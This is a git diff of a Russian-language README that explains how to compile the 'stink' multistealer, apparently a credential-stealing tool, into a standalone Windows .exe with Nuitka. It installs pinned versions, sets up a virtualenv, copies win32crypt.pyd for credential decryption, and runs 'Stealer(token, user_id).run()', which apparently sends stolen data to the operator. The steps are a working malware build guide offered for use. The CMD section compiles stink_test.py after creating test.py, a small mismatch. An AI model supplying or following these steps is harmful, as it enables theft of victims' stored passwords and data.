@@ -112,18 +112,6 @@ if __name__ == "__main__":
 Python является интерпретируемым языком программирования, поэтому мы сначала транслируем его в C++, а затем скомпилируем в .exe файл.
 Для этого нам понадобится Nuitka.
 
-### Установка необходимых инструментов
-
-Устанавливаем Nuitka:
-```
-pip install Nuitka==0.6.16.4
-```
-
-Устанавливаем Stink:
-```
-pip install stink==0.0.3
-```
-
 ### Создание исполняемого файла
 
 Создаем test.py (либо любое другое название) файл со следующим кодом:
@@ -132,8 +120,51 @@ from stink.multistealer import Stealer
 
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
-Открываем терминал Python. Перейдя в директорию с проектом прописываем следующую команду (либо просто открыв терминал, если вы используете PyCharm):
+####PyCharm
+Устанавливаем Nuitka и Stink:
+```
+pip install Nuitka==0.6.16.4
+```
+
+```
+pip install stink==0.0.3
+```
+Открываем терминал и прописываем команду:
 ```python
 nuitka --onefile --include-package=stink test.py
 ```
+####CMD
+Открываем `cmd`.
+
+Прописываем команду:
+```
+pip install virtualenv
+```
+Переходим в папку с файлом test.py:
+```
+cd path\to\file
+```
+Создаем виртуальное окружение и активируем его:
+```
+virtualenv venv
+```
+
+```
+venv\Scripts\activate
+```
+Устанавливаем Nuitka и Stink:
+```
+pip install Nuitka==0.6.16.4
+```
+
+```
+pip install stink==0.0.3
+```
+В появившейся папке venv переходим по пути `\Lib\site-packages\win32\`, копируем файл `win32crypt.pyd` и вставляем по пути `\Lib\site-packages\`.
+
+Возвращаемся к `cmd` и прописываем команду:
+```
+nuitka --onefile --include-package=stink stink_test.py
+```
+
 После выполнения команды получаем test.exe файл.
